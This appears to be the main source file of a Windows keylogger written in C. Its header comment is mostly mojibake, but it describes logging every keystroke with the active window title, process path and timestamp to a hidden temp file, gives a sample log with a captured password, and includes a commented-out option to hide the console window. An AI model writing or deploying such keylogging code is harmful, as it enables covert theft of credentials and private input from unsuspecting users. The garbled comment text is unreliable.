/*
����˵��:
	win32����̨����  ʵ�ֱ������߼�¼�Ĺ���  �����в�������Ϣ��¼��txt�ļ���
	FilenameΪ���ػ�������� Ĭ��Ϊ����.txt  ����2019-04-03.txt ��¼�����û����е�����
	keylog_main() Ϊ��Ҫ�ļ��̼�¼����
		���ҵ�ǰ�ǰ�Ĵ��� ����仯���¼
			��Ϣ��ʽΪ ����ǰ�û� ## ʱ�� ## �������� ## ���ڱ���
						 ��������		
				���磺
				just4fun ## 2019/04/03 15:59:57 ## D:\Notepad++\notepad++.exe ## Selected Tab
				amin[Enter]
				Password[Enter]
				6666666666666[Enter]
		ʵʱ��¼: ���������ﵽһ���ĳ���MAXFILELENGTH�� ���浽%temp%Ŀ¼�����ļ��� ����Ϊ����.txt �� 2019.4.3_15.58.50.txt
			����ش����� C:\Users\[�û���]\AppData\Local\Temp\2019.4.3_15.58.50.txt

	���޸ĵĲ���:
	�жϵ�ǰ���� �Ƿ�ı� ����ı����¼ ���򲻼�¼
*/

#include "common.h"
#include "keyLog.h"
#include "file.h"
#include <time.h>

//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") // ���ô�����������
int main()
{
	//������־�ļ�
	Filename = generateLogFile();
	//��ʼ��¼����
	keylog_main();
 	system("pause");
	return 0;
}